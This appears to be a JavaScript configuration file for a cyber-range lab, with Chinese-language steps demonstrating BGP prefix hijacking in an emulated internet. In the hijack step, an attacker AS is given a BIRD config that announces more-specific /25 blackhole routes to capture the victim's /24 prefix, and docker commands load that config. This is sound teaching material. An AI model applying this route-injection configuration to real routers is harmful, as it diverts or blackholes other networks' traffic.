export const config = [
    {
        headerTitle: "启动靶场",
        text: [{
            shortText: null,
            cmdKwargs: [{
                action: 'compose',
                cmd: "composeUp",
                detach: false,
                composePath: './yesterday_once_more/01_bgp_prefix_hijacking_baidu/demo_output',
                pythonFile: 'BGP_Prefix_Hijacking.py'
            }]
        }],
    },
    {
        headerTitle: '环境设置',
        text: [
            {
                shortText: '环境设置',
                innerHtml: `
                <div>首先，我们需要启动仿真器。</div>
                <div>在本实验中，我们使用 AS-199 来劫持目标地址对应的IP前缀(目标地址块)。为了帮助观察 BGP 劫持效果，我们可以在虚拟机上手动发送数据包(ping)。在 Internet Map 上，我们应该能够看到数据包的流向（在过滤器字段输入 icmp or tcp and net IP前缀1 or net IP前缀1 ... ，然后回车）：</div>
                `,
                cmdKwargs: []
            }
        ],
    },
    {
        headerTitle: '劫持目标网络',
        text: [
            {
                shortText: '劫持目标网络',
                innerHtml: `
<div>步骤 1：攻击者是 AS-199，因此我们首先获取 AS-199 的 BGP 配置文件并进行修改。我们可以使用以下命令从仿真器中获取配置文件。</div>
<div>步骤 2：我们将以下配置内容添加到 AS-199 的 BGP 配置文件的末尾(请替换成您的攻击地址段)。此配置劫持了 10.153.0.0/24 网络。</div>
<div class="code-block">
<div class="code-header">
    <span class="code-title">配置代码</span>
</div>
<pre class="code-content">##############################################
# 添加的 BGP 攻击, 请替换成您的攻击地址段
##############################################

protocol static {
  ipv4 { table t_bgp;  };
  route 10.153.0.0/25 blackhole   {
      bgp_large_community.add(LOCAL_COMM);
  };
  route 10.153.0.128/25 blackhole {
      bgp_large_community.add(LOCAL_COMM);
  };
}</pre>
</div>
<div>步骤 3：完成上述修改后，将修改后的 BGP 配置文件复制回 AS-199，然后重新启动 AS-199 的 BGP 守护进程。我们已将修改后的配置文件放置在 as199_bird.conf_malicious 中。</div>
<div class="code-block">
<div class="code-header"><span class="code-title">命令</span></div>
<pre class="code-content">docker cp as199_bird.conf_malicious as199brd-attacker-bgp-10.199.0.254:/etc/bird/bird.conf
docker exec as199brd-attacker-bgp-10.199.0.254 birdc configure</pre>
</div>
                `,
                cmdKwargs: [
                    {
                        action: 'exec',
                        containerNames: ['as199brd-attacker-bgp-10.199.0.254'],
                        cmd: "rm -rf /etc/bird/as199_bird.conf_malicious && touch /etc/bird/as199_bird.conf_malicious",
                        detach: false
                    },
                    {
                        action: 'append',
                        containerNames: ['as199brd-attacker-bgp-10.199.0.254'],
                        filepath: '/etc/bird/as199_bird.conf_malicious',
                        detach: false
                    },
                    {
                        action: 'cp',
                        srcName: '',
                        dstName: 'as199brd-attacker-bgp-10.199.0.254',
                        srcPath: './yesterday_once_more/01_bgp_prefix_hijacking_baidu/files/as199_bird_include.conf_original',
                        dstPath: '/etc/bird/bird.conf',
                        detach: false
                    },
                    {
                        action: 'exec',
                        containerNames: ['as199brd-attacker-bgp-10.199.0.254'],
                        cmd: "birdc configure",
                        detach: false
                    },
                ]
            },
            {
                shortText: '路由信息',
                innerHtml: `<div>步骤 4：从 Internet Map 上，我们可以看到数据包流向已经改变，现在正流向 AS-199。现在当我们从任何机器 ping 10.153.0.71 时，会发现没有响应。让我们查看 as3brd-r103-10.103.0.3（这是一个中转自治系统）上的路由表，我们可以看到 AS-153 的网络有 3 条记录，其中 10.153.0.0/25 和 10.153.0.128/25 完全覆盖了 10.153.0.0/24。从记录中我们可以看到，前两个地址的下一条路由 (10.3.0.254) 和 10.153.0.0/24 的下一条路由 (10.3.3.253) 不同，这意味着发往 AS-153 的数据包已被重定向。</div>
                <div class="code-block">
                    <div class="code-header"><span class="code-title">命令</span></div>
                    <pre class="code-content">docker exec as3brd-r103-10.103.0.3 ip route'</pre>
                </div>`,
                cmdKwargs: [
                    {
                        action: 'exec',
                        containerNames: ['as3brd-r103-10.103.0.3'],
                        cmd: "ip route",
                        detach: false
                    },
                ]
            },
        ],
    },
    {
        headerTitle: "还原靶场",
        text: [
            {
                shortText: null,
                cmdKwargs: [
                    {
                        action: 'cp',
                        srcName: '',
                        dstName: 'as199brd-attacker-bgp-10.199.0.254',
                        srcPath: './yesterday_once_more/01_bgp_prefix_hijacking_baidu/files/as199_bird.conf_original',
                        dstPath: '/etc/bird/bird.conf',
                        detach: false
                    },
                    {
                        action: 'exec',
                        containerNames: ['as199brd-attacker-bgp-10.199.0.254'],
                        cmd: "birdc configure",
                        detach: false
                    },
                ]
            }
        ],
    },
    {
        headerTitle: "关闭靶场",
        text: [{
            shortText: null,
            cmdKwargs: [{
                action: 'compose',
                cmd: "composeDown",
                detach: false,
                composePath: './yesterday_once_more/01_bgp_prefix_hijacking_baidu/demo_output'
            }]
        }],
    },
]

export const attackEffectConfig = {
    type: "iframe",
}

export default config